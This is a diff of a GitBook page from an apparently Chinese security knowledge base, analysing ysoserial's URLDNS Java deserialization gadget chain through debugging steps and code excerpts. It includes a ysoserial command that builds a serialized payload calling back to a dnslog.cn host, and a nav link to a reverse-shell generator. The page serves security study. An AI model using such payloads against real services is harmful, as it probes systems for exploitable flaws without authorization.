@@ -4,7 +4,7 @@
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>02.URLDNS链分析 · d4m1ts 知识库</title>
+        <title>02.URLDNS链分析 · GitBook</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
@@ -17,7 +17,15 @@
     
             
                 
-                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-search-plus/search.css">
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-code/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-search-pro-fixed/search.css">
                 
             
                 
@@ -29,14 +37,6 @@
                 
             
                 
-                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-splitter/splitter.css">
-                
-            
-                
-                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-page-treeview/style.css">
-                
-            
-                
                 <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-lightbox/css/lightbox.min.css">
                 
             
@@ -45,27 +45,7 @@
                 
             
                 
-                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-code/plugin.css">
-                
-            
-                
                 <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
-                
-            
-                
-                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-pageview-count/plugin.css">
-                
-            
-                
-                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-ancre-navigation/style/plugin.css">
-                
-            
-                
-                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
-                
-            
-                
-                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-insert-logo/plugin.css">
                 
             
                 
@@ -74,6 +54,10 @@
             
                 
                 <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-prism/prism-tomorrow.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-back-to-top-button/plugin.css">
                 
             
                 
@@ -88,6 +72,10 @@
                 <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-fontsettings/website.css">
                 
             
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-theme-d4t/style.css">
+                
+            
         
 
     
@@ -107,7 +95,6 @@
     
 
         
-    
     
     
     <meta name="HandheldFriendly" content="true"/>
@@ -124,37 +111,38 @@
     <link rel="prev" href="01.Apache_Commons_Collections中的反序列化.html" />
     
 
-    
-        <link rel="shortcut icon" href='../../../../README.assets/favicon.ico' type="image/x-icon">
-    
-    
-        <link rel="bookmark" href='../../../../README.assets/favicon.ico' type="image/x-icon">
-    
-    
-        <link rel="apple-touch-icon" href='../../../../README.assets/favicon.ico'>
-    
-    
-        
-        <link rel="apple-touch-icon" sizes="120x120" href="../../../../README.assets/favicon.ico">
-        
-        <link rel="apple-touch-icon" sizes="180x180" href="../../../../README.assets/favicon.ico">
-        
-    
-
     </head>
     <body>
         
 <div class="book">
-    <div class="book-summary">
+    <div class="header-inner">
+        <!-- LOGO -->
+        <div class="logo"></div>
+        <span class="title"></span>
+
+        <!-- Search -->
         
-            
 <div id="book-search-input" role="search">
     <input type="text" placeholder="Type to search" />
 </div>
 
+
+        <!-- Nav -->
+        <ul class="header-nav">
+            <li>
+                <a href="https://markdown.gm7.org/" target="_blank">markdown在线</a>
+            </li><li>
+                <a href="https://rshell.gm7.org/" target="_blank">Reverse Shell Generator</a>
+            </li>
+        </ul>
+    </div>
+
+    <div class="book-summary">
+        <div class="sidebar-nav-space"></div>
+        
+        
+        <nav role="navigation">
             
-                <nav role="navigation">
-                
 
 
 <ul class="summary">
@@ -4711,16 +4699,24 @@
 </ul>
 
 
-                </nav>
-            
+        </nav>
         
+        
+    </div>
+
+    <!-- Content nav -->
+    <div class="book-anchor">
+        <div class="book-anchor-title">ON THIS PAGE</div>
+        <div class="book-anchor-body">
+
+        </div>
     </div>
 
     <div class="book-body">
         
-            <div class="body-inner">
-                
-                    
+        <div class="body-inner">
+            
+            
 
 <div class="book-header" role="navigation">
     
@@ -4735,24 +4731,15 @@
 
 
 
-                    <div class="page-wrapper" tabindex="-1" role="main">
-                        <div class="page-inner">
-                            
-<div class="search-plus" id="book-search-results">
+            <div class="page-wrapper" tabindex="-1" role="main">
+                <div class="page-inner">
+                    
+<div id="book-search-results">
     <div class="search-noresults">
     
-                                <section class="normal markdown-section">
-                                
-                                <html><head></head><body><div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><ul><li><span class="title-icon "></span><a href="#urldns&#x94FE;&#x5229;&#x7528;"><b>1.1. </b>URLDNS&#x94FE;&#x5229;&#x7528;</a></li><li><span class="title-icon "></span><a href="#&#x52A8;&#x6001;&#x8C03;&#x8BD5;ysoserial"><b>1.2. </b>&#x52A8;&#x6001;&#x8C03;&#x8BD5;ysoserial</a></li><li><span class="title-icon "></span><a href="#urldns&#x94FE;&#x5206;&#x6790;"><b>1.3. </b>URLDNS&#x94FE;&#x5206;&#x6790;</a></li><li><span class="title-icon "></span><a href="#&#x601D;&#x8003;"><b>1.4. </b>&#x601D;&#x8003;</a></li><li><span class="title-icon "></span><a href="#&#x603B;&#x7ED3;"><b>1.5. </b>&#x603B;&#x7ED3;</a></li></ul></ul></div><a href="#" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><div class="treeview__container"><ul>
-<li><div><a href="#urldns&#x94FE;&#x5229;&#x7528;">URLDNS&#x94FE;&#x5229;&#x7528;</a><i></i></div></li>
-<li><div><a href="#&#x52A8;&#x6001;&#x8C03;&#x8BD5;ysoserial">&#x52A8;&#x6001;&#x8C03;&#x8BD5;ysoserial</a><i></i></div></li>
-<li><div><a href="#urldns&#x94FE;&#x5206;&#x6790;">URLDNS&#x94FE;&#x5206;&#x6790;</a><i></i></div></li>
-<li><div><a href="#&#x601D;&#x8003;">&#x601D;&#x8003;</a><i></i></div></li>
-<li><div><a href="#&#x603B;&#x7ED3;">&#x603B;&#x7ED3;</a><i></i></div></li>
-</ul>
-</div>
-
-<h2 id="urldns&#x94FE;&#x5229;&#x7528;"><a name="urldns&#x94FE;&#x5229;&#x7528;" class="anchor-navigation-ex-anchor" href="#urldns&#x94FE;&#x5229;&#x7528;"><i class="fa fa-link" aria-hidden="true"></i></a>1.1. URLDNS&#x94FE;&#x5229;&#x7528;</h2>
+                    <section class="normal markdown-section">
+                        
+                        <h2 id="urldns&#x94FE;&#x5229;&#x7528;">URLDNS&#x94FE;&#x5229;&#x7528;</h2>
 <p>&#x5148;&#x6765;&#x770B;&#x770B;&#x7528;<a href="https://github.com/frohoff/ysoserial" target="_blank">ysoserial</a>&#x5DE5;&#x5177;&#x600E;&#x4E48;&#x5229;&#x7528;&#x7684;&#x3002;</p>
 <pre class="language-"><code class="lang-bash"><span class="token comment"># &#x751F;&#x6210;&#x5E8F;&#x5217;&#x5316;Payload</span>
 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://urldns.epraqr.dnslog.cn/ <span class="token operator">&gt;</span> a.ser
@@ -4773,8 +4760,8 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://urldns.epraqr.dnslog.cn
 <span class="token punctuation">}</span>
 </code></pre>
 <p>DNSLog&#x6210;&#x529F;&#x6536;&#x5230;&#x4E86;&#x8BF7;&#x6C42;</p>
-<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210806170017457.png" data-lightbox="53d82bb0-6f4f-493b-9864-3f5be2052304" data-title="image-20210806170017457"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210806170017457.png" alt="image-20210806170017457"></a></p>
-<h2 id="&#x52A8;&#x6001;&#x8C03;&#x8BD5;ysoserial"><a name="&#x52A8;&#x6001;&#x8C03;&#x8BD5;ysoserial" class="anchor-navigation-ex-anchor" href="#&#x52A8;&#x6001;&#x8C03;&#x8BD5;ysoserial"><i class="fa fa-link" aria-hidden="true"></i></a>1.2. &#x52A8;&#x6001;&#x8C03;&#x8BD5;ysoserial</h2>
+<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210806170017457.png" data-lightbox="667dded3-bf0d-4f04-9d85-491f9520142a" data-title="image-20210806170017457"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210806170017457.png" alt="image-20210806170017457"></a></p>
+<h2 id="&#x52A8;&#x6001;&#x8C03;&#x8BD5;ysoserial">&#x52A8;&#x6001;&#x8C03;&#x8BD5;ysoserial</h2>
 <p>&#x7B80;&#x800C;&#x8A00;&#x4E4B;&#xFF0C;&#x5C31;&#x662F;&#x7ED9;<a href="https://github.com/frohoff/ysoserial" target="_blank">ysoserial</a>&#x9879;&#x76EE;&#x52A0;&#x8F7D;&#x5230;idea&#x4E2D;&#xFF0C;&#x65B9;&#x4FBF;&#x6211;&#x4EEC;&#x5206;&#x6790;&#x8C03;&#x8BD5;&#x3002;</p>
 <p>&#x4E0B;&#x8F7D;ysoserial&#x9879;&#x76EE;&#x540E;&#xFF0C;&#x5BFC;&#x5165;&#x5230;idea&#x4E2D;&#xFF0C;&#x89E3;&#x51B3;&#x6389;&#x4F9D;&#x8D56;&#x95EE;&#x9898;</p>
 <blockquote>
@@ -4782,16 +4769,16 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://urldns.epraqr.dnslog.cn
 <p>&#x5B9E;&#x5728;&#x4E0D;&#x884C;&#x5C31;&#x624B;&#x52A8;&#x4E0B;&#x8F7D;jar&#x7136;&#x540E;&#x5BFC;&#x5165;&#x5427;</p>
 </blockquote>
 <p>idea&#x4F1A;&#x81EA;&#x52A8;&#x8BC6;&#x522B;ysoserial&#x7684;&#x4E3B;&#x7C7B;<code>ysoserial.GeneratePayload</code>&#xFF0C;&#x7136;&#x540E;&#x76F4;&#x63A5;&#x8FD0;&#x884C;&#x9879;&#x76EE;&#x5373;&#x53EF;&#xFF1B;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>pom.xml</code>&#x6587;&#x4EF6;&#x7684;<code>mainClass</code>&#x5C5E;&#x6027;&#x770B;&#x5230;&#x4E3B;&#x7C7B;&#xFF0C;&#x5982;&#x679C;&#x6B63;&#x5E38;&#x663E;&#x793A;ysoserial&#x7684;&#x7528;&#x6CD5;&#xFF0C;&#x5C31;&#x8BF4;&#x660E;&#x9879;&#x76EE;&#x90E8;&#x7F72;&#x6210;&#x529F;&#x4E86;&#x3002;</p>
-<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210806180252517.png" data-lightbox="47ed9cdf-012f-4ace-8e7f-facb541b8dad" data-title="image-20210806180252517"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210806180252517.png" alt="image-20210806180252517"></a></p>
+<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210806180252517.png" data-lightbox="ff62ba3d-5cec-4a65-a1f8-fc8decb6c3e5" data-title="image-20210806180252517"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210806180252517.png" alt="image-20210806180252517"></a></p>
 <p>&#x56E0;&#x4E3A;ysoserial&#x751F;&#x6210;payload&#x9700;&#x8981;&#x4F20;&#x5165;&#x53C2;&#x6570;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x624B;&#x52A8;&#x914D;&#x7F6E;&#x4E00;&#x4E0B;&#x9879;&#x76EE;&#xFF0C;&#x4F20;&#x5165;&#x53C2;&#x6570;</p>
 <p><code>Run --&gt; Edit Configurations...</code></p>
-<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210806180358514.png" data-lightbox="307ef63e-a9c5-40c9-aa8f-e1d735a5896d" data-title="image-20210806180358514"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210806180358514.png" alt="image-20210806180358514"></a></p>
+<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210806180358514.png" data-lightbox="4b6883b5-100d-46f9-9b5f-8fb362e9db33" data-title="image-20210806180358514"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210806180358514.png" alt="image-20210806180358514"></a></p>
 <p>&#x7136;&#x540E;&#x5728;<code>Program arguments</code>&#x8F93;&#x5165;&#x5BF9;&#x5E94;&#x7684;&#x53C2;&#x6570;</p>
-<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210806180620820.png" data-lightbox="56dbe7aa-cd4b-4ea9-87ae-0696d3775a2b" data-title="image-20210806180620820"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210806180620820.png" alt="image-20210806180620820"></a></p>
+<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210806180620820.png" data-lightbox="4c2bafa0-059b-45d2-902e-2e375c607219" data-title="image-20210806180620820"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210806180620820.png" alt="image-20210806180620820"></a></p>
 <p>&#x518D;&#x6B21;&#x8FD0;&#x884C;</p>
-<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210806180640137.png" data-lightbox="0b209c06-51b5-438a-b528-001085ec7439" data-title="image-20210806180640137"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210806180640137.png" alt="image-20210806180640137"></a></p>
+<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210806180640137.png" data-lightbox="452529e4-7127-4535-9e35-a2e10ab281ef" data-title="image-20210806180640137"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210806180640137.png" alt="image-20210806180640137"></a></p>
 <p>&#x751F;&#x6210;&#x4E86;&#x5E8F;&#x5217;&#x5316;&#x6570;&#x636E;&#xFF0C;&#x8BF4;&#x660E;&#x4E00;&#x5207;&#x8FD0;&#x884C;&#x6210;&#x529F;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x7528;idea&#x5F00;&#x59CB;&#x52A8;&#x6001;&#x8C03;&#x8BD5;&#x4E86;&#x3002;</p>
-<h2 id="urldns&#x94FE;&#x5206;&#x6790;"><a name="urldns&#x94FE;&#x5206;&#x6790;" class="anchor-navigation-ex-anchor" href="#urldns&#x94FE;&#x5206;&#x6790;"><i class="fa fa-link" aria-hidden="true"></i></a>1.3. URLDNS&#x94FE;&#x5206;&#x6790;</h2>
+<h2 id="urldns&#x94FE;&#x5206;&#x6790;">URLDNS&#x94FE;&#x5206;&#x6790;</h2>
 <p>URLDNS&#x662F;ysoserial&#x91CC;&#x9762;&#x5C31;&#x7B80;&#x5355;&#x7684;&#x4E00;&#x6761;&#x5229;&#x7528;&#x94FE;&#xFF0C;&#x4F46;URLDNS&#x7684;&#x5229;&#x7528;&#x6548;&#x679C;&#x662F;&#x53EA;&#x80FD;&#x89E6;&#x53D1;&#x4E00;&#x6B21;dns&#x8BF7;&#x6C42;&#xFF0C;&#x800C;&#x4E0D;&#x80FD;&#x53BB;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x3002;<strong>&#x6BD4;&#x8F83;&#x9002;&#x7528;&#x4E8E;&#x6F0F;&#x6D1E;&#x9A8C;&#x8BC1;&#x8FD9;&#x4E00;&#x5757;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x65E0;&#x56DE;&#x663E;&#x7684;&#x547D;&#x4EE4;&#x6267;&#x884C;</strong>&#xFF0C;&#x800C;&#x4E14;URLDNS&#x8FD9;&#x6761;&#x5229;&#x7528;&#x94FE;&#x5E76;&#x4E0D;&#x4F9D;&#x8D56;&#x4E8E;&#x7B2C;&#x4E09;&#x65B9;&#x7684;&#x7C7B;&#xFF0C;&#x800C;&#x662F;JDK&#x4E2D;&#x5185;&#x7F6E;&#x7684;&#x4E00;&#x4E9B;&#x7C7B;&#x548C;&#x65B9;&#x6CD5;&#x3002;</p>
 <p>&#x6253;&#x5F00;<code>ysoserial/payloads/URLDNS.java</code>&#x7684;&#x6E90;&#x7801;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5B83;&#x7684;&#x8C03;&#x7528;&#x94FE;</p>
 <pre class="language-"><code class="lang-java"> <span class="token operator">*</span>   <span class="token class-name">Gadget</span> <span class="token class-name">Chain</span><span class="token operator">:</span>
@@ -4802,33 +4789,33 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://urldns.epraqr.dnslog.cn
 </code></pre>
 <p>&#x8FD9;&#x6837;&#x770B;&#x8FD8;&#x662F;&#x6709;&#x70B9;&#x4E0D;&#x7279;&#x522B;&#x660E;&#x767D;&#xFF0C;&#x8C03;&#x8BD5;&#x5206;&#x6790;&#x770B;&#x770B;&#x3002;</p>
 <p>&#x6A21;&#x62DF;&#x5BF9;&#x5E8F;&#x5217;&#x5316;&#x540E;&#x7684;ser&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5904;&#x7406;&#xFF0C;&#x7136;&#x540E;&#x5206;&#x6790;&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#xFF0C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF08;&#x7B2C;&#x4E00;&#x8282;&#x4E2D;&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4EE3;&#x7801;&#xFF09;&#xFF1A;</p>
-<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807111415065.png" data-lightbox="7704eddb-799a-483b-9540-9ca9438c12c0" data-title="image-20210807111415065"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807111415065.png" alt="image-20210807111415065"></a></p>
+<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807111415065.png" data-lightbox="e97fbfb4-49ae-41d6-b8b3-99262d1ebdf1" data-title="image-20210807111415065"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807111415065.png" alt="image-20210807111415065"></a></p>
 <p>&#x6839;&#x636E;&#x4E0A;&#x8FF0;&#x7684;<code>Gadget Chain</code>&#xFF0C;&#x53EF;&#x89C1;&#x89E6;&#x53D1;&#x70B9;&#x662F;&#x5728;<code>HashMap.readObject()</code>&#xFF0C;&#x4E3A;&#x4E86;&#x8282;&#x7EA6;&#x65F6;&#x95F4;&#xFF0C;&#x6211;&#x4EEC;&#x76F4;&#x63A5;&#x5728;<code>HashMap.readObject()</code>&#x5904;&#x4E0B;&#x65AD;&#x70B9;&#x3002;</p>
-<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807111319640.png" data-lightbox="7b56c75d-b48b-429b-8be0-1335d6657379" data-title="image-20210807111319640"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807111319640.png" alt="image-20210807111319640"></a></p>
+<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807111319640.png" data-lightbox="9f97039a-a535-45b7-8b67-19fc7e1cfd93" data-title="image-20210807111319640"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807111319640.png" alt="image-20210807111319640"></a></p>
 <p>&#x8FD0;&#x884C;&#x4E3B;&#x7A0B;&#x5E8F;&#x5F00;&#x59CB;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x81EA;&#x52A8;&#x5728;&#x6211;&#x4EEC;&#x4E0B;&#x65AD;&#x70B9;&#x7684;&#x5730;&#x65B9;&#x6682;&#x505C;&#x3002;</p>
 <p>&#x7136;&#x540E;&#x4E00;&#x76F4;F8</p>
 <p>&#x6839;&#x636E;<code>Gadget Chain</code>&#x53D1;&#x73B0;&#x4F7F;&#x7528;&#x4E86;<code>putVal&#x65B9;&#x6CD5;</code>&#xFF0C;&#x4F46;&#x8FD9;&#x4E0D;&#x662F;&#x91CD;&#x70B9;&#xFF0C;&#x91CD;&#x70B9;&#x662F;&#x4F1A;&#x8C03;&#x7528;<code>hash</code>&#x65B9;&#x6CD5;</p>
-<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807113940786.png" data-lightbox="786bdaf6-6dba-4b7b-8c66-8da3963f48db" data-title="image-20210807113940786"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807113940786.png" alt="image-20210807113940786"></a></p>
+<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807113940786.png" data-lightbox="93bd043a-0883-41fd-a6c5-9600067f8b96" data-title="image-20210807113940786"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807113940786.png" alt="image-20210807113940786"></a></p>
 <p>&#x8DDF;&#x8FDB;<code>hash</code>&#x65B9;&#x6CD5;</p>
-<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807114339387.png" data-lightbox="bd26859e-057d-4170-bfab-f9093b1fff10" data-title="image-20210807114339387"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807114339387.png" alt="image-20210807114339387"></a></p>
+<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807114339387.png" data-lightbox="8a0b608e-d3de-4aa6-94aa-83082c1fc363" data-title="image-20210807114339387"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807114339387.png" alt="image-20210807114339387"></a></p>
 <p>&#x5982;&#x679C;key&#x4E0D;&#x662F;null&#x5C31;&#x4F1A;&#x8C03;&#x7528;<code>key.hashCode</code>&#x65B9;&#x6CD5;&#xFF0C;&#x8DDF;&#x8FDB;<code>hashCode</code>&#x65B9;&#x6CD5;&#xFF0C;&#x8FD9;&#x91CC;&#x8C03;&#x7528;&#x7684;&#x662F;URL&#x7C7B;&#x4E2D;&#x7684;<code>hashCode</code>&#x65B9;&#x6CD5;</p>
-<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807114632343.png" data-lightbox="f1717e7f-711b-4f2a-a8e2-1c937d4e9667" data-title="image-20210807114632343"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807114632343.png" alt="image-20210807114632343"></a></p>
+<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807114632343.png" data-lightbox="49d2c318-6836-4058-b379-eac88484d476" data-title="image-20210807114632343"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807114632343.png" alt="image-20210807114632343"></a></p>
 <p>&#x5F53;<code>hashCode</code>&#x5C5E;&#x6027;&#x4E0D;&#x4E3A;-1&#x65F6;&#x5C31;&#x76F4;&#x63A5;return&#xFF0C;&#x5C31;&#x4E0D;&#x4F1A;&#x89E6;&#x53D1;hashCode&#x65B9;&#x6CD5;&#xFF0C;&#x4E5F;&#x5C31;&#x4E0D;&#x4F1A;&#x89E6;&#x53D1;&#x63A5;&#x4E0B;&#x6765;&#x7684;DNS&#x89E3;&#x6790;</p>
 <p>&#x8FD9;&#x91CC;<code>hashCode</code>&#x503C;&#x9ED8;&#x8BA4;&#x4E3A; <code>-1</code>&#xFF0C;&#x6240;&#x4EE5;&#x4F1A;&#x6267;&#x884C; <code>handler.hashCode(this);</code></p>
 <blockquote>
 <p>URLDNS&#x94FE;&#x4E2D;&#x4E5F;&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x5C06;<code>hashCode</code>&#x7684;&#x503C;&#x8BBE;&#x7F6E;&#x4E3A;-1</p>
 </blockquote>
-<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807162552452.png" data-lightbox="c604e97e-2e34-4d57-a220-9e8195746d60" data-title="image-20210807162552452"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807162552452.png" alt="image-20210807162552452"></a></p>
+<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807162552452.png" data-lightbox="4f8417b5-7494-483e-93ea-b18fa98b189b" data-title="image-20210807162552452"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807162552452.png" alt="image-20210807162552452"></a></p>
 <p>&#x8DDF;&#x4E00;&#x4E0B;<code>handler</code>&#xFF0C;&#x770B;&#x770B;&#x662F;&#x4EC0;&#x4E48;&#x73A9;&#x610F;&#x513F;</p>
-<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807115000929.png" data-lightbox="3cdb4a97-4ee7-4bbd-9a70-ce3b6a1e48d1" data-title="image-20210807115000929"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807115000929.png" alt="image-20210807115000929"></a></p>
+<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807115000929.png" data-lightbox="8f61f675-a83d-448a-90e7-e586541a21c2" data-title="image-20210807115000929"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807115000929.png" alt="image-20210807115000929"></a></p>
 <p>&#x662F;<code>URLStreamHandler</code>&#x7C7B;&#xFF08;&#x4E5F;&#x662F;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;<code>handler</code>&#xFF09;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x8FD9;&#x91CC;&#x8C03;&#x7528;&#x7684;&#x662F;<code>URLStreamHandler.hashCode</code></p>
 <p>&#x8DDF;&#x8FDB;<code>hashCode</code>&#x65B9;&#x6CD5;&#xFF0C;&#x53D1;&#x73B0;&#x4F1A;&#x8C03;&#x7528;<code>getHostAddress</code>&#x65B9;&#x6CD5;&#x5BF9;&#x4F20;&#x5165;&#x7684;URL&#x5BF9;&#x8C61;&#x8FDB;&#x884C;&#x89E3;&#x6790;</p>
-<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807115253251.png" data-lightbox="1052ea71-238f-4288-a46d-004df3311b27" data-title="image-20210807115253251"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807115253251.png" alt="image-20210807115253251"></a></p>
+<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807115253251.png" data-lightbox="1abe11e8-bf86-4682-9fc7-540a37b69b87" data-title="image-20210807115253251"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807115253251.png" alt="image-20210807115253251"></a></p>
 <p>&#x8DDF;&#x8FDB;<code>getHostAddress</code>&#x65B9;&#x6CD5;&#xFF0C;&#x53D1;&#x73B0;&#x4F1A;&#x8C03;&#x7528;<code>getHost</code>&#x65B9;&#x6CD5;&#xFF0C;&#x7136;&#x540E;&#x8C03;&#x7528;<code>InetAddress.getByName(host)</code>&#x53D1;&#x8D77;DNS&#x8BF7;&#x6C42;&#xFF0C;&#x81F3;&#x6B64;&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#x5B8C;&#x6BD5;&#x3002;</p>
-<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807115854926.png" data-lightbox="0108faa7-8b94-48f4-a7f2-8cd03436890c" data-title="image-20210807115854926"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807115854926.png" alt="image-20210807115854926"></a></p>
-<h2 id="&#x601D;&#x8003;"><a name="&#x601D;&#x8003;" class="anchor-navigation-ex-anchor" href="#&#x601D;&#x8003;"><i class="fa fa-link" aria-hidden="true"></i></a>1.4. &#x601D;&#x8003;</h2>
+<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807115854926.png" data-lightbox="6f811a77-4809-47a5-bae4-a49823a662b3" data-title="image-20210807115854926"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807115854926.png" alt="image-20210807115854926"></a></p>
+<h2 id="&#x601D;&#x8003;">&#x601D;&#x8003;</h2>
 <p>&#x5206;&#x6790;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x53D1;&#x73B0;<code>HashMap.put</code>&#x65B9;&#x6CD5;&#x4E2D;&#x4E5F;&#x8C03;&#x7528;&#x4E86;<code>hash</code>&#x65B9;&#x6CD5;&#xFF0C;&#x7136;&#x540E;&#x53BB;&#x8FDB;&#x884C;<code>hashCode</code>&#x8BA1;&#x7B97;&#x7B49;&#x3002;</p>
-<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210808103619949.png" data-lightbox="54f8bd97-eba7-49c0-8aa4-ea30583e569e" data-title="image-20210808103619949"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210808103619949.png" alt="image-20210808103619949"></a></p>
+<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210808103619949.png" data-lightbox="6c1e6867-4333-4dda-a204-78ffc5c7dde1" data-title="image-20210808103619949"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210808103619949.png" alt="image-20210808103619949"></a></p>
 <p>&#x90A3;&#x4E48;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x5728;<code>put</code>&#x64CD;&#x4F5C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4E5F;&#x4F1A;&#x89E6;&#x53D1;&#x5BF9;&#x5E94;&#x7684;dns&#x89E3;&#x6790;&#xFF0C;&#x8BD5;&#x8BD5;&#x770B;&#x3002;</p>
 <pre class="language-"><code class="lang-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>
 
@@ -4845,11 +4832,11 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://urldns.epraqr.dnslog.cn
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span>
 </code></pre>
